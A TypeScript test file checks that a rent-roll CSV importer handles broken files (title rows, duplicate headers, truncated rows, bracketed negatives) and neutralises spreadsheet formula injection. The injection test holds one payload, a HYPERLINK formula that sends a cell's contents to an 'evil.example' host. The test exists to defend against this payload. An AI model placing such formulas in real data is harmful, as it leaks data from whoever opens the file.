/**
 * test/db/import-structural.dbtest.ts — the FILE is broken, not the cell
 *
 * Auth:   service-role client vs LOCAL Supabase (npm run test:db)
 *
 * Notes:  Value corruption tests the VALIDATORS. Structural corruption tests the PARSER — and it is the layer
 *         nobody writes tests for and every agency produces, because it is simply what Excel does to a file on
 *         the way out:
 *
 *           · a merged title row above the headers        ("TENANT SCHEDULE — MARCH 2026" in A1)
 *           · a duplicated column name                    (two "Email" columns; one silently wins)
 *           · a file truncated mid-row                    (dropped upload, full disk)
 *           · an accounting negative                      ( (6 600,50) — a CREDIT that reads as a debit )
 *           · scientific notation                         ( 6.6005E+03 — R6.60 to a naive parser )
 *           · a whitespace-only cell                      (not a value, and not empty either)
 *           · a formula                                   ( =HYPERLINK(...) )
 *
 *         FORMULA INJECTION is not about our parser at all. A cell beginning `=`, `+`, `-` or `@` is EXECUTED
 *         by Excel when the next person opens a spreadsheet containing it — and the next person is the agency's
 *         bookkeeper opening an export of their own tenant list. If we store it verbatim, we become the delivery
 *         mechanism for an attack on our own customer. The tenant name is attacker-controlled: anyone who can
 *         get onto a rent roll can put a formula in it.
 */
import { describe, it, expect, beforeAll, afterAll } from "vitest"
import Papa from "papaparse"
import { svc, seedEmptyOrg, seedUser, teardownOrg, teardownUser } from "@/test/db/tier"
import { matchColumns } from "@/lib/import/columnMapper"
import { toColumnMapping, toImportDecisions } from "@/lib/import/decisions"
import { runImport, type ImportError, type ImportResult } from "@/lib/import/importRunner"
import { generateBook } from "@/test/import/book"
import { render } from "@/test/import/dialect"
import { withTitleRow, withDuplicateHeader, truncatedMidRow } from "@/test/import/corrupt"

const db = svc()

/** Serialise a rendered book back to CSV so the FILE itself can be broken, then parse it as the wizard does. */
function toCsv(headers: string[], rows: Record<string, string>[]): string {
  return Papa.unparse({ fields: headers, data: rows.map((r) => headers.map((h) => r[h] ?? "")) })
}

function parseCsv(csv: string): { headers: string[]; rows: Record<string, string>[] } {
  const parsed = Papa.parse<Record<string, string>>(csv, { header: true, skipEmptyLines: true, comments: "#" })
  return { headers: parsed.meta.fields ?? [], rows: parsed.data }
}

/** The header row EXACTLY as the file writes it — duplicates and all, before papaparse dedupes them away. */
function rawHeaders(csv: string): string[] {
  const first = csv.split("\n").find((l) => l.trim().length > 0) ?? ""
  return (Papa.parse<string[]>(first).data[0] ?? []).map((h) => String(h).trim())
}

async function importCsv(orgId: string, agentId: string, csv: string): Promise<ImportResult> {
  const { headers, rows } = parseCsv(csv)
  const suggestions = matchColumns(headers)
  const w: Record<string, { field: string; entity: string }> = {}
  for (const s of suggestions) if (s.field) w[s.column] = { field: s.field, entity: s.entity }

  return runImport(
    rows, toColumnMapping(w),
    toImportDecisions({
      columnMapping: w, expiredLeaseAction: "import_as_expired",
      bankConsentAttested: true, depositsHeldAttested: true,
      // The RAW header row — papaparse has already collapsed duplicate names into one object key by the time
      // `rows` exists, so this is the only surviving evidence that the file had two columns called "Email".
      fileHeaders: rawHeaders(csv),
    }),
    orgId, agentId, undefined, db,
  )
}

describe("STRUCTURAL — the file is broken, not the cell", () => {
  let agentId: string
  const orgs: string[] = []
  let cleanCsv: string

  beforeAll(() => {
    agentId = seedUser()
    const truth = generateBook({ seed: 601, leases: 6, variety: true })
    const book = render(truth, "en-ZA")
    cleanCsv = toCsv(book.headers, book.rows)
  })

  afterAll(() => {
    for (const o of orgs.splice(0)) teardownOrg(o)
    teardownUser(agentId)
  })

  const freshOrg = async () => {
    const o = await seedEmptyOrg(db)
    orgs.push(o)
    return o
  }

  it("a title row above the headers does not silently import an empty book", async () => {
    // Every report-style export has one. papaparse reads the title as the HEADER row, so every real column is
    // then unmapped — and an importer that shrugs at that produces zero leases and calls it a success.
    const org = await freshOrg()
    const result = await importCsv(org, agentId, withTitleRow(cleanCsv))

    // We do not require it to be CLEVER (skipping the title is a wizard feature, not a correctness one). We
    // require it not to LIE: if nothing could be mapped, it must not report a successful import of nothing.
    if (result.leasesCreated === 0) {
      expect(
        result.errors.length,
        "no lease could be created from a file whose headers are a title row — the import must SAY so, not " +
        "report a clean run over an empty database",
      ).toBeGreaterThan(0)
    }
  }, 120_000)

  it("a duplicated column name is reported — one of them is being silently dropped", async () => {
    // Two columns mapping to one field: getField takes the first and the other's data vanishes. The agency
    // never learns which of their two "Email" columns we believed.
    const org = await freshOrg()
    const result = await importCsv(org, agentId, withDuplicateHeader(cleanCsv))

    const told = (result.errors as ImportError[]).some(
      (e) => /both map|all map|ignored|duplicate/i.test(e.message),
    )
    expect(
      told,
      "when two columns land on one field, only one survives — the agency must be told which, because the " +
      "other column's data is being thrown away",
    ).toBe(true)
  }, 120_000)

  it("a file truncated mid-row imports the intact rows and does not invent the broken one", async () => {
    // A dropped upload. The last row stops in the middle of a cell — papaparse will hand us a short row with
    // missing trailing fields. The danger is not that it fails; it is that the half-row imports as a lease with
    // silently-defaulted money terms.
    const org = await freshOrg()
    const result = await importCsv(org, agentId, truncatedMidRow(cleanCsv))

    const { data: leases, error } = await db
      .from("leases").select("rent_amount_cents, start_date").eq("org_id", org)
    expect(error).toBeFalsy()

    // Whatever survived must be COMPLETE. A lease with no rent, or a defaulted rent, from a half-written row is
    // the exact failure this whole harness exists to prevent.
    const hollow = (leases ?? []).filter((l) => !l.rent_amount_cents || !l.start_date)
    expect(
      hollow.length,
      "a row that was cut in half must not become a lease with invented money terms — refuse it, or say so",
    ).toBe(0)

    expect(result.errors.length + (leases ?? []).length, "the run must produce SOMETHING — a report or rows")
      .toBeGreaterThan(0)
  }, 120_000)

  it("an accounting negative — (6 600,50) — is never read as a POSITIVE rent", async () => {
    // Excel writes a credit as (1 234,00). A parser that strips the brackets reads a NEGATIVE as a POSITIVE:
    // the agency's credit silently becomes a debit, and the tenant is billed for it.
    const org = await freshOrg()
    const rows = parseCsv(cleanCsv).rows
    rows[0]["Monthly Rent"] = "(6 600,50)"
    const result = await importCsv(org, agentId, toCsv(parseCsv(cleanCsv).headers, rows))

    const { data: leases, error } = await db
      .from("leases").select("rent_amount_cents, units!inner(unit_number)").eq("org_id", org)
    expect(error).toBeFalsy()

    const landed = (leases ?? []).find((l) => {
      const u = l.units as unknown as { unit_number: string } | { unit_number: string }[]
      return (Array.isArray(u) ? u[0]?.unit_number : u?.unit_number) === "1"
    })

    // Either it refused the row, or it imported it — but it must NEVER have imported it as +660050.
    if (landed) {
      expect(
        landed.rent_amount_cents,
        "(6 600,50) is a NEGATIVE in accounting notation. Reading it as +660050 turns a credit into a debit " +
        "and bills the tenant for it — the single most expensive way to be confidently wrong.",
      ).not.toBe(660050)
    } else {
      expect(
        (result.errors as ImportError[]).some((e) => e.severity === "error"),
        "if the bracketed amount was refused, the row must be named",
      ).toBe(true)
    }
  }, 120_000)

  it("a formula in a tenant name is NEUTRALISED — we do not ship a CSV-injection payload to the next reader", async () => {
    // The tenant name is attacker-controlled: anyone who can get onto a rent roll can put a formula in it. If we
    // store `=HYPERLINK(...)` verbatim, the agency's own export of their own tenant list executes it in Excel on
    // the bookkeeper's machine. We would be the delivery mechanism.
    const org = await freshOrg()
    const headers = parseCsv(cleanCsv).headers
    const rows = parseCsv(cleanCsv).rows
    const PAYLOAD = '=HYPERLINK("http://evil.example/?leak="&A1,"Click for refund")'
    rows[0]["First Name"] = PAYLOAD

    await importCsv(org, agentId, toCsv(headers, rows))

    const { data: contacts, error } = await db
      .from("contacts").select("first_name").eq("org_id", org).eq("primary_role", "tenant")
    expect(error).toBeFalsy()

    const stored = (contacts ?? []).map((c) => String(c.first_name ?? ""))
    const dangerous = stored.filter((n) => /^[=+\-@]/.test(n.trim()))

    expect(
      dangerous,
      "a stored value starting with = + - or @ is EXECUTED by Excel when the next person opens an export of " +
      "this data. Storing it verbatim makes Pleks the delivery mechanism for an attack on our own customer.",
    ).toEqual([])
  }, 120_000)

  it("an empty file, and a one-row file, both behave", async () => {
    // The degenerate shapes. An empty file must not crash and must not claim success; a single-row file must
    // import exactly one lease (the off-by-one that only shows up at n=1).
    const emptyOrg = await freshOrg()
    const headerOnly = cleanCsv.split("\n")[0]
    const emptyResult = await importCsv(emptyOrg, agentId, headerOnly)
    expect(emptyResult.leasesCreated, "an empty file creates nothing").toBe(0)

    const oneOrg = await freshOrg()
    const oneRow = cleanCsv.split("\n").slice(0, 2).join("\n")
    const oneResult = await importCsv(oneOrg, agentId, oneRow)
    expect(oneResult.leasesCreated, "a one-row file creates exactly one lease").toBe(1)
  }, 180_000)
})
